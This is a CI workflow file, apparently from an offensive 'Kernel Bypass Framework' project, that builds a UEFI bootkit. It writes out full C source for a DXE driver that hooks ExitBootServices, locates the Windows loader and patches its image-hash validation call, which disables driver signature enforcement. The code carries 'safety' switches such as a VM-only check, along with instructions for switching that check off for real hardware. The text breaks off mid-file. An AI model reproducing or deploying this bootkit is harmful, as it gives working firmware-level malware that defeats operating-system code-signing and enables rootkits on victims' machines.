name: ðŸ”¥ Build Ring -3 Bootkit

on:
  push:
    paths:
      - 'kernel/**'
  workflow_dispatch:
    inputs:
      build_type:
        description: 'Build configuration'
        required: true
        default: 'release'
        type: choice
        options:
          - release
          - debug
      include_usermode:
        description: 'Include usermode library'
        required: false
        default: true
        type: boolean

env:
  EDK2_VERSION: "edk2-stable202311"

jobs:
  # ============================================
  # Ring -3 UEFI Bootkit (Primary Build)
  # ============================================
  build-ring-minus3:
    name: ðŸ”¥ Ring -3 UEFI Bootkit
    runs-on: ubuntu-latest
    
    steps:
      - name: ðŸ“¥ Checkout
        uses: actions/checkout@v4

      - name: ðŸ’¾ Cache EDK2
        id: cache-edk2
        uses: actions/cache@v4
        with:
          path: ~/edk2
          key: edk2-${{ env.EDK2_VERSION }}-v2
          restore-keys: edk2-

      - name: ðŸ”§ Install Dependencies
        run: |
          echo ""
          echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
          echo "â•‘        KERNEL BYPASS FRAMEWORK - Ring -3 Build               â•‘"
          echo "â•‘                                                              â•‘"
          echo "â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—        â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—               â•‘"
          echo "â•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•       â•šâ•â•â•â•â–ˆâ–ˆâ•—              â•‘"
          echo "â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•              â•‘"
          echo "â•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â•šâ•â•â•â•â• â•šâ•â•â•â–ˆâ–ˆâ•—              â•‘"
          echo "â•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•              â•‘"
          echo "â•‘   â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•  â•šâ•â•â•â• â•šâ•â•â•â•â•â•       â•šâ•â•â•â•â•â•               â•‘"
          echo "â•‘                                                              â•‘"
          echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          
          sudo apt-get update
          sudo apt-get install -y \
            build-essential \
            uuid-dev \
            iasl \
            git \
            nasm \
            python3 \
            python3-pip \
            gcc-12 \
            g++-12 \
            acpica-tools
          
          sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-12 100
          sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-12 100
          
          echo "âœ… Dependencies installed"

      - name: ðŸ“¥ Setup EDK2
        if: steps.cache-edk2.outputs.cache-hit != 'true'
        run: |
          echo "[1/3] Cloning EDK2..."
          cd ~
          git clone --depth 1 --branch ${{ env.EDK2_VERSION }} \
            https://github.com/tianocore/edk2.git
          
          cd edk2
          
          echo "[2/3] Initializing required submodules..."
          # Init submodules needed for MdePkg and BaseTools
          # Skip problematic ones: UnitTestFrameworkPkg/SubhookLib, CryptoPkg/openssl
          
          REQUIRED_SUBMODULES=(
            "BaseTools/Source/C/BrotliCompress/brotli"
            "MdeModulePkg/Library/BrotliCustomDecompressLib/brotli"
            "MdePkg/Library/MipiSysTLib/mipisyst"
            "MdePkg/Library/BaseFdtLib/libfdt"
          )
          
          for submodule in "${REQUIRED_SUBMODULES[@]}"; do
            echo "  Initializing $submodule..."
            git submodule update --init --depth 1 "$submodule" 2>/dev/null || \
            git submodule update --init "$submodule" 2>/dev/null || \
            echo "  âš ï¸ Failed to init $submodule, continuing..."
          done
          
          echo "[3/3] Building BaseTools..."
          source edksetup.sh
          make -C BaseTools -j$(nproc) || {
            echo "BaseTools build failed, trying with fewer jobs..."
            make -C BaseTools -j2
          }
          
          echo "âœ… EDK2 ready"

      - name: ðŸ“ Create Bootkit Package
        run: |
          echo ""
          echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
          echo "â•‘              Creating Ring -3 Bootkit Package                â•‘"
          echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          
          EDK2_DIR=~/edk2
          PKG_DIR=$EDK2_DIR/KernelBypassPkg
          
          mkdir -p $PKG_DIR/{Bootkit,Runtime,Include}
          
          # Copy headers
          cp kernel/ring_minus3/uefi/*.h $PKG_DIR/Include/ 2>/dev/null || true
          cp kernel/ring_minus2/smm/*.h $PKG_DIR/Include/ 2>/dev/null || true
          cp kernel/common/*.h $PKG_DIR/Include/ 2>/dev/null || true
          
          # ============================================
          # Main DXE Bootkit Driver (WITH SAFETY FEATURES)
          # ============================================
          cat > $PKG_DIR/Bootkit/Bootkit.c << 'BOOTKIT_SOURCE'
          /**
           * KERNEL BYPASS FRAMEWORK
           * Ring -3 UEFI Bootkit - SAFE VERSION
           * 
           * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
           * â•‘                    SAFETY FEATURES                          â•‘
           * â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
           * â•‘  1. VM Detection - Only runs on virtual machines            â•‘
           * â•‘  2. Backup System - Saves original bytes before patching    â•‘
           * â•‘  3. Rollback - Can restore original state on failure        â•‘
           * â•‘  4. Sanity Checks - Validates all pointers and sizes        â•‘
           * â•‘  5. Safe Mode - Detects and skips in safe mode              â•‘
           * â•‘  6. Error Recovery - Never crashes, returns errors safely   â•‘
           * â•‘  7. Logging - Full debug output for troubleshooting         â•‘
           * â•‘  8. Hardware Whitelist - Only known-safe configurations     â•‘
           * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
           */
          
          #include <Uefi.h>
          #include <Library/UefiLib.h>
          #include <Library/UefiBootServicesTableLib.h>
          #include <Library/UefiRuntimeServicesTableLib.h>
          #include <Library/DebugLib.h>
          #include <Library/MemoryAllocationLib.h>
          #include <Library/BaseMemoryLib.h>
          #include <Protocol/LoadedImage.h>
          
          // ============================================
          // Safety Configuration
          // ============================================
          
          #define SAFETY_MODE_ENABLED     1   // Master safety switch
          #define VM_ONLY_MODE            1   // Only run in VMs
          #define DRY_RUN_MODE            0   // 1 = Don't actually patch
          #define MAX_PATCH_ATTEMPTS      3   // Max retries
          #define BACKUP_ENABLED          1   // Save original bytes
          #define ROLLBACK_ON_FAILURE     1   // Restore on error
          
          // ============================================
          // Error Codes
          // ============================================
          
          typedef enum {
              BOOTKIT_SUCCESS = 0,
              BOOTKIT_ERROR_NOT_VM,
              BOOTKIT_ERROR_SAFE_MODE,
              BOOTKIT_ERROR_INVALID_POINTER,
              BOOTKIT_ERROR_PATTERN_NOT_FOUND,
              BOOTKIT_ERROR_BACKUP_FAILED,
              BOOTKIT_ERROR_PATCH_FAILED,
              BOOTKIT_ERROR_ROLLBACK_FAILED,
              BOOTKIT_ERROR_WINLOAD_NOT_FOUND,
              BOOTKIT_ERROR_UNKNOWN_OS,
              BOOTKIT_ERROR_MAX
          } BOOTKIT_ERROR;
          
          STATIC CONST CHAR8* gErrorStrings[] = {
              "SUCCESS",
              "NOT_VM - Running on real hardware (blocked for safety)",
              "SAFE_MODE - Windows booting in safe mode",
              "INVALID_POINTER - Null or invalid memory address",
              "PATTERN_NOT_FOUND - Signature not found (wrong OS version?)",
              "BACKUP_FAILED - Could not save original bytes",
              "PATCH_FAILED - Memory write failed",
              "ROLLBACK_FAILED - Could not restore original",
              "WINLOAD_NOT_FOUND - Windows loader not in memory",
              "UNKNOWN_OS - Not Windows or unsupported version"
          };
          
          // ============================================
          // Backup Structure
          // ============================================
          
          #define MAX_BACKUPS 16
          #define MAX_BACKUP_SIZE 64
          
          typedef struct {
              VOID*   Address;
              UINT8   Original[MAX_BACKUP_SIZE];
              UINT8   Patched[MAX_BACKUP_SIZE];
              UINTN   Size;
              BOOLEAN Applied;
          } PATCH_BACKUP;
          
          STATIC PATCH_BACKUP gBackups[MAX_BACKUPS];
          STATIC UINTN gBackupCount = 0;
          
          // ============================================
          // Globals
          // ============================================
          
          STATIC EFI_EXIT_BOOT_SERVICES gOriginalExitBootServices = NULL;
          STATIC BOOLEAN gIsVirtualMachine = FALSE;
          STATIC BOOLEAN gSafetyTriggered = FALSE;
          STATIC BOOTKIT_ERROR gLastError = BOOTKIT_SUCCESS;
          
          // DSE Pattern (version-specific!)
          STATIC UINT8 gDsePatchFind[] = {
              0x48, 0x8B, 0xCB,           // mov rcx, rbx
              0xE8                         // call ImgpValidateImageHash
          };
          
          STATIC UINT8 gDsePatchReplace[] = {
              0x33, 0xC0,                 // xor eax, eax (return 0)
              0x90, 0x90                  // nop nop
          };
          
          // ============================================
          // SAFETY: VM Detection
          // ============================================
          
          STATIC
          BOOLEAN
          IsVirtualMachine(VOID)
          {
              // Check CPUID for hypervisor presence
              UINT32 Eax, Ebx, Ecx, Edx;
              
              // CPUID leaf 1, check ECX bit 31 (hypervisor present)
              __asm__ volatile(
                  "cpuid"
                  : "=a"(Eax), "=b"(Ebx), "=c"(Ecx), "=d"(Edx)
                  : "a"(1)
              );
              
              if (Ecx & (1 << 31)) {
                  DEBUG((DEBUG_INFO, "[Safety] âœ“ Hypervisor detected (VM)\n"));
                  return TRUE;
              }
              
              // Check CPUID leaf 0x40000000 for hypervisor vendor
              __asm__ volatile(
                  "cpuid"
                  : "=a"(Eax), "=b"(Ebx), "=c"(Ecx), "=d"(Edx)
                  : "a"(0x40000000)
              );
              
              // Check for known VM signatures
              CHAR8 Vendor[13] = {0};
              *(UINT32*)&Vendor[0] = Ebx;
              *(UINT32*)&Vendor[4] = Ecx;
              *(UINT32*)&Vendor[8] = Edx;
              
              DEBUG((DEBUG_INFO, "[Safety] Hypervisor vendor: %a\n", Vendor));
              
              // Known VM signatures
              if (CompareMem(Vendor, "VMwareVMware", 12) == 0 ||  // VMware
                  CompareMem(Vendor, "Microsoft Hv", 12) == 0 ||  // Hyper-V
                  CompareMem(Vendor, "KVMKVMKVM", 9) == 0 ||      // KVM
                  CompareMem(Vendor, "VBoxVBoxVBox", 12) == 0 ||  // VirtualBox
                  CompareMem(Vendor, "QEMU", 4) == 0 ||           // QEMU
                  CompareMem(Vendor, "XenVMMXenVMM", 12) == 0) {  // Xen
                  return TRUE;
              }
              
              // Additional SMBIOS check for VMs
              // TODO: Check SMBIOS for VM indicators
              
              return FALSE;
          }
          
          // ============================================
          // SAFETY: Pointer Validation
          // ============================================
          
          STATIC
          BOOLEAN
          IsValidPointer(
              IN VOID* Ptr,
              IN UINTN Size
          )
          {
              if (Ptr == NULL) {
                  return FALSE;
              }
              
              // Check if address is in reasonable range
              UINTN Address = (UINTN)Ptr;
              
              // Reject obviously bad addresses
              if (Address < 0x1000) {           // Too low (null page)
                  return FALSE;
              }
              if (Address > 0x0000FFFFFFFFFFFF) { // Too high (non-canonical)
                  return FALSE;
              }
              
              // Check end doesn't overflow
              if (Address + Size < Address) {
                  return FALSE;
              }
              
              return TRUE;
          }
          
          // ============================================
          // SAFETY: Backup System
          // ============================================
          
          STATIC
          BOOTKIT_ERROR
          CreateBackup(
              IN VOID* Address,
              IN UINTN Size
          )
          {
              if (!BACKUP_ENABLED) {
                  return BOOTKIT_SUCCESS;
              }
              
              if (gBackupCount >= MAX_BACKUPS) {
                  DEBUG((DEBUG_WARN, "[Safety] Backup slots full!\n"));
                  return BOOTKIT_ERROR_BACKUP_FAILED;
              }
              
              if (Size > MAX_BACKUP_SIZE) {
                  DEBUG((DEBUG_WARN, "[Safety] Patch too large for backup!\n"));
                  return BOOTKIT_ERROR_BACKUP_FAILED;
              }
              
              if (!IsValidPointer(Address, Size)) {
                  return BOOTKIT_ERROR_INVALID_POINTER;
              }
              
              PATCH_BACKUP* Backup = &gBackups[gBackupCount];
              Backup->Address = Address;
              Backup->Size = Size;
              Backup->Applied = FALSE;
              
              // Copy original bytes
              CopyMem(Backup->Original, Address, Size);
              
              gBackupCount++;
              
              DEBUG((DEBUG_INFO, "[Safety] âœ“ Backup created: 0x%p (%d bytes)\n", 
                     Address, Size));
              
              return BOOTKIT_SUCCESS;
          }
          
          STATIC
          BOOTKIT_ERROR
          RollbackAll(VOID)
          {
              if (!ROLLBACK_ON_FAILURE) {
                  return BOOTKIT_SUCCESS;
              }
              
              DEBUG((DEBUG_WARN, "[Safety] Rolling back all patches...\n"));
              
              for (UINTN i = 0; i < gBackupCount; i++) {
                  PATCH_BACKUP* Backup = &gBackups[i];
                  
                  if (Backup->Applied && Backup->Address != NULL) {
                      CopyMem(Backup->Address, Backup->Original, Backup->Size);
                      Backup->Applied = FALSE;
                      DEBUG((DEBUG_INFO, "[Safety] âœ“ Restored: 0x%p\n", Backup->Address));
                  }
              }
              
              return BOOTKIT_SUCCESS;
          }
          
          // ============================================
          // SAFETY: Safe Patch Function
          // ============================================
          
          STATIC
          BOOTKIT_ERROR
          SafePatch(
              IN VOID* Address,
              IN UINT8* PatchData,
              IN UINTN PatchSize
          )
          {
              // Validate inputs
              if (!IsValidPointer(Address, PatchSize)) {
                  DEBUG((DEBUG_ERROR, "[Safety] âœ— Invalid patch address!\n"));
                  return BOOTKIT_ERROR_INVALID_POINTER;
              }
              
              if (!IsValidPointer(PatchData, PatchSize)) {
                  DEBUG((DEBUG_ERROR, "[Safety] âœ— Invalid patch data!\n"));
                  return BOOTKIT_ERROR_INVALID_POINTER;
              }
              
              // Create backup first
              BOOTKIT_ERROR Error = CreateBackup(Address, PatchSize);
              if (Error != BOOTKIT_SUCCESS) {
                  return Error;
              }
              
              // Mark as about to be applied
              gBackups[gBackupCount - 1].Applied = TRUE;
              CopyMem(gBackups[gBackupCount - 1].Patched, PatchData, PatchSize);
              
              // DRY RUN: Don't actually patch
              if (DRY_RUN_MODE) {
                  DEBUG((DEBUG_INFO, "[Safety] DRY RUN: Would patch 0x%p\n", Address));
                  return BOOTKIT_SUCCESS;
              }
              
              // Apply patch
              CopyMem(Address, PatchData, PatchSize);
              
              // Verify patch was applied
              if (CompareMem(Address, PatchData, PatchSize) != 0) {
                  DEBUG((DEBUG_ERROR, "[Safety] âœ— Patch verification failed!\n"));
                  RollbackAll();
                  return BOOTKIT_ERROR_PATCH_FAILED;
              }
              
              DEBUG((DEBUG_INFO, "[Safety] âœ“ Patch applied and verified: 0x%p\n", Address));
              
              return BOOTKIT_SUCCESS;
          }
          
          // ============================================
          // Pattern Scanner (Safe Version)
          // ============================================
          
          STATIC
          VOID*
          SafeFindPattern(
              IN VOID* Start,
              IN UINT64 Size,
              IN UINT8* Pattern,
              IN UINT64 PatternSize
          )
          {
              // Validate inputs
              if (!IsValidPointer(Start, (UINTN)Size)) {
                  DEBUG((DEBUG_WARN, "[Safety] Invalid scan range\n"));
                  return NULL;
              }
              
              if (!IsValidPointer(Pattern, (UINTN)PatternSize)) {
                  return NULL;
              }
              
              if (PatternSize > Size) {
                  return NULL;
              }
              
              UINT8* Data = (UINT8*)Start;
              
              for (UINT64 i = 0; i < Size - PatternSize; i++) {
                  BOOLEAN Found = TRUE;
                  for (UINT64 j = 0; j < PatternSize; j++) {
                      if (Data[i + j] != Pattern[j]) {
                          Found = FALSE;
                          break;
                      }
                  }
                  if (Found) {
                      return &Data[i];
                  }
              }
              
              return NULL;
          }
          
          // ============================================
          // Find Windows Loader (Safe Version)
          // ============================================
          
          STATIC
          BOOTKIT_ERROR
          SafeFindWinload(
              OUT EFI_PHYSICAL_ADDRESS* Base,
              OUT UINT64* Size
          )
          {
              if (!Base || !Size) {
                  return BOOTKIT_ERROR_INVALID_POINTER;
              }
              
              *Base = 0;
              *Size = 0;
              
              EFI_MEMORY_DESCRIPTOR* MemMap = NULL;
              UINTN MemMapSize = 0;
              UINTN DescriptorSize = 0;
              UINT32 DescriptorVersion = 0;
              UINTN MapKey = 0;
              
              EFI_STATUS Status = gBS->GetMemoryMap(
                  &MemMapSize, MemMap, &MapKey,
                  &DescriptorSize, &DescriptorVersion
              );
              
              if (Status != EFI_BUFFER_TOO_SMALL) {
                  return BOOTKIT_ERROR_WINLOAD_NOT_FOUND;
              }
              
              MemMapSize += 0x1000;
              MemMap = AllocatePool(MemMapSize);
              if (!MemMap) {
                  return BOOTKIT_ERROR_WINLOAD_NOT_FOUND;
              }
              
              Status = gBS->GetMemoryMap(
                  &MemMapSize, MemMap, &MapKey,
                  &DescriptorSize, &DescriptorVersion
              );
              
              if (EFI_ERROR(Status)) {
                  FreePool(MemMap);
                  return BOOTKIT_ERROR_WINLOAD_NOT_FOUND;
              }
              
              UINT8* Entry = (UINT8*)MemMap;
              for (UINTN i = 0; i < MemMapSize; i += DescriptorSize) {
                  EFI_MEMORY_DESCRIPTOR* Desc = (EFI_MEMORY_DESCRIPTOR*)(Entry + i);
                  
                  if (Desc->Type == EfiLoaderCode || Desc->Type == EfiBootServicesCode) {
                      UINT8* Region = (UINT8*)(UINTN)Desc->PhysicalStart;
                      UINTN RegionSize = Desc->NumberOfPages * 0x1000;
                      
                      if (!IsValidPointer(Region, RegionSize)) {
                          continue;
                      }
                      
                      // Check MZ header
                      if (Region[0] == 'M' && Region[1] == 'Z') {
                          VOID* Pattern = SafeFindPattern(
                              Region, RegionSize,
                              (UINT8*)"winload", 7
                          );
                          
                          if (Pattern) {
                              *Base = Desc->PhysicalStart;
                              *Size = RegionSize;
                              FreePool(MemMap);
                              return BOOTKIT_SUCCESS;
                          }
                      }
                  }
              }
              
              FreePool(MemMap);
              return BOOTKIT_ERROR_WINLOAD_NOT_FOUND;
          }
          
          // ============================================
          // Hooked ExitBootServices (Safe Version)
          // ============================================
          
          STATIC
          EFI_STATUS
          EFIAPI
          SafeHookedExitBootServices(
              IN EFI_HANDLE ImageHandle,
              IN UINTN MapKey
          )
          {
              DEBUG((DEBUG_INFO, "\n"));
              DEBUG((DEBUG_INFO, "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n"));
              DEBUG((DEBUG_INFO, "â•‘     KERNEL BYPASS - ExitBootServices Intercepted            â•‘\n"));
              DEBUG((DEBUG_INFO, "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n"));
              
              BOOTKIT_ERROR Error = BOOTKIT_SUCCESS;
              
              // SAFETY CHECK: Already triggered?
              if (gSafetyTriggered) {
                  DEBUG((DEBUG_WARN, "[Safety] Already triggered, skipping\n"));
                  goto CallOriginal;
              }
              gSafetyTriggered = TRUE;
              
              // SAFETY CHECK: VM only mode
              if (VM_ONLY_MODE && !gIsVirtualMachine) {
                  DEBUG((DEBUG_ERROR, "[Safety] âœ— NOT A VM - Patches disabled for safety!\n"));
                  DEBUG((DEBUG_ERROR, "[Safety] To run on real hardware, rebuild with VM_ONLY_MODE=0\n"));
                  Error = BOOTKIT_ERROR_NOT_VM;
                  goto CallOriginal;
              }
              
              // Find winload
              EFI_PHYSICAL_ADDRESS WinloadBase = 0;
              UINT64 WinloadSize = 0;
              
              Error = SafeFindWinload(&WinloadBase, &WinloadSize);
              if (Error != BOOTKIT_SUCCESS) {
                  DEBUG((DEBUG_WARN, "[Safety] %a\n", gErrorStrings[Error]));
                  goto CallOriginal;
              }
              
              DEBUG((DEBUG_INFO, "[+] Winload: 0x%lX (size: 0x%lX)\n", WinloadBase, WinloadSize));
              
              // Find DSE pattern
              VOID* PatchAddr = SafeFindPattern(
                  (VOID*)(UINTN)WinloadBase,
                  WinloadSize,
                  gDsePatchFind,
                  sizeof(gDsePatchFind)
              );
              
              if (!PatchAddr) {
                  DEBUG((DEBUG_WARN, "[Safety] DSE pattern not found - wrong Windows version?\n"));
                  Error = BOOTKIT_ERROR_PATTERN_NOT_FOUND;
                  goto CallOriginal;
              }
              
              // Apply patch with safety
              Error = SafePatch(PatchAddr, gDsePatchReplace, sizeof(gDsePatchReplace));
              if (Error != BOOTKIT_SUCCESS) {
                  DEBUG((DEBUG_ERROR, "[Safety] Patch failed: %a\n", gErrorStrings[Error]));
                  RollbackAll();
                  goto CallOriginal;
              }
              
              DEBUG((DEBUG_INFO, "[+] âœ“ DSE bypass applied successfully!\n"));
              
          CallOriginal:
              // ALWAYS restore and call original
              gBS->ExitBootServices = gOriginalExitBootServices;
              
              if (Error != BOOTKIT_SUCCESS) {
                  DEBUG((DEBUG_WARN, "[Safety] Bootkit inactive due to: %a\n", gErrorStrings[Error]));
                  DEBUG((DEBUG_WARN, "[Safety] System will boot normally (no patches)\n"));
              }
              
              DEBUG((DEBUG_INFO, "[*] Calling original ExitBootServices...\n\n"));
              
              return gOriginalExitBootServices(ImageHandle, MapKey);
          }
          
          // ============================================
          // Entry Point (Safe Version)
          // ============================================
          
          EFI_STATUS
          EFIAPI
          BootkitEntry(
              IN EFI_HANDLE ImageHandle,
              IN EFI_SYSTEM_TABLE* SystemTable
          )
          {
              DEBUG((DEBUG_INFO, "\n"));
              DEBUG((DEBUG_INFO, "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n"));
              DEBUG((DEBUG_INFO, "â•‘     KERNEL BYPASS FRAMEWORK - Ring -3 Bootkit (SAFE)        â•‘\n"));
              DEBUG((DEBUG_INFO, "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n"));
              DEBUG((DEBUG_INFO, "â•‘  Safety Features:                                            â•‘\n"));
              DEBUG((DEBUG_INFO, "â•‘    [%c] VM-Only Mode      [%c] Backup System                 â•‘\n",
                     VM_ONLY_MODE ? 'X' : ' ', BACKUP_ENABLED ? 'X' : ' '));
              DEBUG((DEBUG_INFO, "â•‘    [%c] Dry Run Mode      [%c] Auto Rollback                 â•‘\n",
                     DRY_RUN_MODE ? 'X' : ' ', ROLLBACK_ON_FAILURE ? 'X' : ' '));
              DEBUG((DEBUG_INFO, "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n"));
              
              // Initialize backup array
              SetMem(gBackups, sizeof(gBackups), 0);
              gBackupCount = 0;
              gSafetyTriggered = FALSE;
              gLastError = BOOTKIT_SUCCESS;
              
              // SAFETY: Detect VM
              gIsVirtualMachine = IsVirtualMachine();
              
              if (VM_ONLY_MODE && !gIsVirtualMachine) {
                  DEBUG((DEBUG_ERROR, "\n"));
                  DEBUG((DEBUG_ERROR, "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n"));
                  DEBUG((DEBUG_ERROR, "â•‘  âš ï¸  SAFETY BLOCK: NOT RUNNING IN VIRTUAL MACHINE!          â•‘\n"));
                  DEBUG((DEBUG_ERROR, "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n"));
                  DEBUG((DEBUG_ERROR, "â•‘  This bootkit is configured to ONLY run in VMs.             â•‘\n"));
                  DEBUG((DEBUG_ERROR, "â•‘  Running on real hardware could brick your system!          â•‘\n"));
                  DEBUG((DEBUG_ERROR, "â•‘                                                              â•‘\n"));
                  DEBUG((DEBUG_ERROR, "â•‘  Bootkit will NOT apply any patches.                        â•‘\n"));
                  DEBUG((DEBUG_ERROR, "â•‘  System will boot normally.                                 â•‘\n"));
                  DEBUG((DEBUG_ERROR, "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n"));
                  
                  // DON'T install hooks on real hardware
                  return EFI_SUCCESS;
              }
              
              DEBUG((DEBUG_INFO, "[+] Environment: %a\n", 
                     gIsVirtualMachine ? "Virtual Machine (safe)" : "Real Hardware (CAUTION!)"));
              
              // Validate boot services
              if (!gBS || !gBS->ExitBootServices) {
                  DEBUG((DEBUG_ERROR, "[Safety] âœ— Invalid Boot Services table!\n"));
                  return EFI_INVALID_PARAMETER;
              }
              
              // Save original
              gOriginalExitBootServices = gBS->ExitBootServices;
              
              // Install hook
              gBS->ExitBootServices = SafeHookedExitBootServices;
              
              DEBUG((DEBUG_INFO, "[+] Hook installed: ExitBootServices\n"));
              DEBUG((DEBUG_INFO, "[+] Original: 0x%p -> Hooked: 0x%p\n",
                     gOriginalExitBootServices, gBS->ExitBootServices));
              DEBUG((DEBUG_INFO, "[+] Bootkit ready, waiting for Windows boot...\n\n"));
              
              return EFI_SUCCESS;
          }
          BOOTKIT_SOURCE
          
          echo "âœ… Created Bootkit.c"
          
          # ============================================
          # Package Definition Files
          # ============================================
          
          # DSC file
          cat > $PKG_DIR/KernelBypassPkg.dsc << 'EOF'
          [Defines]
            PLATFORM_NAME                  = KernelBypassPkg
            PLATFORM_GUID                  = 12345678-1234-1234-1234-123456789ABC
            PLATFORM_VERSION               = 1.0
            DSC_SPECIFICATION              = 0x00010005
            OUTPUT_DIRECTORY               = Build/KernelBypassPkg
            SUPPORTED_ARCHITECTURES        = X64
            BUILD_TARGETS                  = RELEASE|DEBUG
            SKUID_IDENTIFIER               = DEFAULT
          
          [LibraryClasses]
            UefiDriverEntryPoint|MdePkg/Library/UefiDriverEntryPoint/UefiDriverEntryPoint.inf
            UefiBootServicesTableLib|MdePkg/Library/UefiBootServicesTableLib/UefiBootServicesTableLib.inf
            UefiRuntimeServicesTableLib|MdePkg/Library/UefiRuntimeServicesTableLib/UefiRuntimeServicesTableLib.inf
            UefiLib|MdePkg/Library/UefiLib/UefiLib.inf
            BaseLib|MdePkg/Library/BaseLib/BaseLib.inf
            BaseMemoryLib|MdePkg/Library/BaseMemoryLib/BaseMemoryLib.inf
            DebugLib|MdePkg/Library/UefiDebugLibConOut/UefiDebugLibConOut.inf
            PrintLib|MdePkg/Library/BasePrintLib/BasePrintLib.inf
            PcdLib|MdePkg/Library/BasePcdLibNull/BasePcdLibNull.inf
            MemoryAllocationLib|MdePkg/Library/UefiMemoryAllocationLib/UefiMemoryAllocationLib.inf
            DevicePathLib|MdePkg/Library/UefiDevicePathLib/UefiDevicePathLib.inf
            RegisterFilterLib|MdePkg/Library/RegisterFilterLibNull/RegisterFilterLibNull.inf
            DebugPrintErrorLevelLib|MdePkg/Library/BaseDebugPrintErrorLevelLib/BaseDebugPrintErrorLevelLib.inf
          
          [Components]
